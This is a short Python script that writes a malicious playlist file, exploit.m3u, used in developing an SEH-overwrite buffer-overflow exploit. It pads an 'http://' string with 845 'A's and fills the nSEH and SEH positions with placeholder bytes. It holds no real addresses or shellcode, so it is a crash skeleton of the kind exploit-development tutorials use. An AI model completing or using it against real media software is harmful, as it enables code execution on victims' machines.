buffer = ("http://" + "A" * 845)
nseh = ("B" * 4)
seh  = ("C" * 4)
junk = ("D" * 60)
 
f= open("exploit.m3u",'w')
f.write(buffer + nseh + seh + junk)
f.close()
